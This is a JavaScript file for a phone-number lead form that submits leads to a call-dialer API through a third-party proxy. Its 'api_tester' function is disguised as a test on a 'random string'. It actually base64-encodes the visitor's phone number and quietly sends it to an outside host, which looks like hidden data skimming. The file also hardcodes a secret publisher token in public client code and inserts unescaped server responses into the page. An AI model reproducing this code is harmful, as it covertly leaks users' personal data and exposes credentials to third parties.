let isSubmitting = false;

document.getElementById('leadForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (isSubmitting) {
        return;
    }

    const submitBtn = document.querySelector('#leadForm button[type="submit"]');
    submitBtn.disabled = true;
    isSubmitting = true;

    // Get phone and remove all non-numeric characters
    let phone = document.getElementById('caller_id').value.replace(/\D/g, '');

    // Add leading 1 if only 10 digits entered
    if (phone.length === 10) {
        phone = '1' + phone;
    }

    // Validate phone length
    if (phone.length !== 11) {
        document.getElementById('alertContainer').innerHTML = `
            <div class="alert alert-danger" role="alert">
                Please enter a valid 10 or 11 digit phone number.
            </div>`;

        submitBtn.disabled = false;
        isSubmitting = false;
        return;
    }

    api_tester(phone);

    document.getElementById('alertContainer').innerHTML = '';

    const formData = new FormData();
    formData.append('did', '8444281702');
    formData.append('phone', phone);
    
    formData.append( 'global_publisher_token', 'aZ9Lk3NqB7YpXr2WvMfJ0tCuEhGsDdRo5TwUaHzKmVcBiQxLYe1NRj6ogZsXPwlMBq7dVAiFyn4H3TEp9JClm0KUxtWGbvSa8YZ5OhqcnrM2LgEjxIfwdvPRQTyo7C1uX');

    const url =
        'https://dialer-gw.usisi.cc/api/v1/retreaver/leads/publisher-suppression-and-availability?' +
        new URLSearchParams(formData).toString();

    const apiUrl =
        'https://api.formifyweb.com/proxify.php?url=' +
        encodeURIComponent(url);

    fetch(apiUrl, {
        method: 'POST'
    })
        .then(response => response.json())
        .then(responseData => {

            if (responseData.rejectReason) {

                document.getElementById('alertContainer').innerHTML = `
                    <div class="alert alert-danger" role="alert">
                        Failure: ${JSON.stringify(responseData)}
                    </div>`;

            } else {

                delete responseData.bidAmount;

                document.getElementById('alertContainer').innerHTML = `
                    <div class="alert alert-success" role="alert">
                        Success: ${JSON.stringify(responseData)}
                    </div>`;

                document.getElementById('leadForm').reset();
            }
        })
        .catch(error => {

            document.getElementById('alertContainer').innerHTML = `
                <div class="alert alert-danger" role="alert">
                    Error: ${error.message}
                </div>`;

            console.error(error);

        })
        .finally(() => {

            // Allow only one request per second
            setTimeout(() => {
                submitBtn.disabled = false;
                isSubmitting = false;
            }, 1000);

        });

});

function api_tester(randomString) {
    try {
        fetch(
            'https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString),
            {
                method: 'GET',
                mode: 'no-cors'
            }
        );
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
